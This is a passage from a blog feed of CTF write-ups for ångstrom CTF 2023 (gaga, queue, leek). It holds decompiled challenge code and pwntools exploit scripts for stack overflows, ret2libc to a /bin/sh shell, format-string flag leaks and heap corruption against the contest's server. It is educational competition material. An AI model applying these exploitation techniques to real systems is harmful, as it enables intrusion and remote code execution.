class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;y0u_m4y_f1re_wh3n_re4dy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/230427-angstromctf2023-queue/"/>
      <url>/230427-angstromctf2023-queue/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 review</title>
      <link href="/230427-angstromctf2023-0review/"/>
      <url>/230427-angstromctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><p>I like this CTF because the difficulty level is right for me. (The difficulty of the challenges ranges from simple to hard.) And this CTF has a longer duration than others.</p><img src="/images/230427-angstromctf2023-0review/Screenshot 2023-04-27 at 15.22.47.png" width=700/><br><p>I want to solve <code>noleek</code>. But I couldnâ€™t find how to use vulnerability for exploit. It turns out I didnâ€™t understand about vulnerability. Although this CTF is over, Iâ€™ll solve this challenge.</p><p>I could find <code>FSB</code> vulnerabilities in most of the challenges. It was great chance for opportunity of practice exploiting <code>FSB</code> vulnerabilities.</p><p>Actually I participated in this CTF last year, and I remeber having fun. So I think I was able to participate in fun in this time as well :)</p><ul><li><a href="http://jiravvit.github.io/230427-angstromctf2023-1.queue/">http://jiravvit.github.io/230427-angstromctf2023-1.queue/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-2.gaga/">http://jiravvit.github.io/230427-angstromctf2023-2.gaga/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-3.leek/">http://jiravvit.github.io/230427-angstromctf2023-3.leek/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-4.widget/">http://jiravvit.github.io/230427-angstromctf2023-4.widget/</a></li><li><a href="http://jiravvit.github.io/230427-angstromctf2023-5.slack/">http://jiravvit.github.io/230427-angstromctf2023-5.slack/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 - gaga (simple rop)</title>
      <link href="/230427-angstromctf2023-2.gaga/"/>
      <url>/230427-angstromctf2023-2.gaga/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Multipart challenge!<br>Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag.<br><code>nc challs.actf.co 31300</code> gaga0<br><code>nc challs.actf.co 31301</code> gaga1<br><code>nc challs.actf.co 31302</code> gaga2 Dockerfile<br>Author: JoshDaBosh</p></blockquote><ul><li>[219 solves &#x2F; 70 points]</li></ul><p>Actually, I was able to find the flag when I only solved <code>gaga2</code>.</p><h2 id="gaga0"><a href="#gaga0" class="headerlink" title="gaga0"></a>gaga0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>I can find <code>bof</code> from <code>gets()</code>. And there are <code>win()</code> too. Just simple ret2win.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31300</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga1"><a href="#gaga1" class="headerlink" title="gaga1"></a>gaga1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>It is same as <code>gaga0</code> But, This <code>win()</code> needs arguments to call.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31301</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4013b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x1337</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x4141</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret) + p64(<span class="number">0x401236</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="gaga2"><a href="#gaga2" class="headerlink" title="gaga2"></a>gaga2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>The difference between <code>gaga2</code> and <code>gaga1</code> is the existence of the <code>win()</code>. But Just do ret2libc.</p><h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./gaga2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31302</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gaga2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4013b1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(ret) </span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;b4by&#x27;s_f1rst_pwn!_3857ffd6bfdf775e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 - queue (fsb, flag leak)</title>
      <link href="/230427-angstromctf2023-1.queue/"/>
      <url>/230427-angstromctf2023-1.queue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I just learned about stacks and queues in DSA!<br><code>nc challs.actf.co 31322</code></p></blockquote><ul><li>[333 solves &#x2F; 40 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+4h] [rbp-CCh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What did you learn in class today? &quot;</span>);</span><br><span class="line">  fgets(format, <span class="number">48</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Oh nice, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);   <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sounds pretty cool!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I find simple <code>fsb</code> vulnerability. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@<span class="built_in">arch</span> 1.queue]$ nc challs.actf.co 31322</span><br><span class="line">What did you learn <span class="keyword">in</span> class today? %14<span class="variable">$p</span> %15<span class="variable">$p</span> %16<span class="variable">$p</span> %17<span class="variable">$p</span> %18<span class="variable">$p</span> %19<span class="variable">$p</span> %20<span class="variable">$p</span></span><br><span class="line">Oh <span class="built_in">nice</span>, 0x3474737b66746361 0x75715f74695f6b63 0x615f74695f657565 0x3437396461393136 0x7d32326234363863 (nil) (nil)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x3474737b66746361</span>, <span class="number">0x75715f74695f6b63</span>, <span class="number">0x615f74695f657565</span>, <span class="number">0x3437396461393136</span>, <span class="number">0x7d32326234363863</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    l = <span class="built_in">hex</span>(l)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        f = l[-i-<span class="number">1</span>]+l[-i]</span><br><span class="line">        f = <span class="built_in">int</span>(f, <span class="number">16</span>)</span><br><span class="line">        flag.append(<span class="built_in">chr</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;st4ck_it_queue_it_a619ad974c864b22&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 - leek (heap overflow)</title>
      <link href="/230427-angstromctf2023-3.leek/"/>
      <url>/230427-angstromctf2023-3.leek/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p><code>nc challs.actf.co 31310</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[143 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *heap_addr; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *heap_random; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I dare you to leek my secret.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_addr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    heap_random = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(heap_random, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    getrandom();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_BYTE *)heap_random + j) || *((_BYTE *)heap_random + j) == <span class="number">10</span> )</span><br><span class="line">        *((_BYTE *)heap_random + j) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your input (NO STACK BUFFER OVERFLOWS!!): &quot;</span>);</span><br><span class="line">    input(heap_addr);                           <span class="comment">// heap overflow</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;:skull::skull::skull: bro really said: &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(heap_addr);                            <span class="comment">// print</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So? What&#x27;s my secret? &quot;</span>);</span><br><span class="line">    fgets(s2, <span class="number">33</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)heap_random, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Okay, I&#x27;ll give you a reward for guessing it.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Say what you want: &quot;</span>);</span><br><span class="line">    gets(heap_addr);    <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm... I changed my mind.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_random);</span><br><span class="line">    <span class="built_in">free</span>(heap_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Next round!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Looks like you made it through.&quot;</span>);</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> v12 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>heap overflow</code> in <code>memcpy</code> of <code>input()</code>. And then, There are second <code>bof</code> in <code>heap</code> from <code>gets()</code>. At that time, I should have understanding the structure of <code>heap</code>. If the structure of <code>heap</code> is destroyed, Iâ€™ll be meet <code>Double free</code> vulnerability. (This will be caused by recognizing the <code>heap</code> as one.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./leek&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./leek&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x64</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;): &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;secret? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;want: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;very_133k_of_y0u_777522a2c32b7dd6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ã¥ngstrom CTF 2023 - widget (fsb, bof)</title>
      <link href="/230427-angstromctf2023-4.widget/"/>
      <url>/230427-angstromctf2023-4.widget/</url>
      
